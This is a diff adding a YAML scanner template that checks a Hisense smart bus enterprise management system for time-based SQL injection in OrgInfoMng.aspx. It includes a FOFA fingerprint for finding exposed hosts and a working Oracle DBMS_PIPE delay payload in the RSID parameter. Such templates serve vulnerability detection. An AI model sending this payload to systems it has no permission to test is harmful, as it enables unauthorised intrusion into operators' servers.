@@ -1,0 +1,17 @@
+id: poc-yaml-hisense-transtech-orginfomng-aspx-sqli
+info:
+  name: 海信智能公交企业管理系统 OrgInfoMng.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 海信智能公交企业管理系统
+  fofa: body="var _FactoryData"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /Erp/ErpAdmin/Form/OrgInfoMng.aspx?RSID=1'and+1=(DBMS_PIPE.RECEIVE_MESSAGE('a',{{.t1}}))+and+'1'='1
+  expression: status_code == 200 && contains(body,"Error Report") && contains(body,"SQL")
+    && duration > t1 && duration < t2
+transport: http
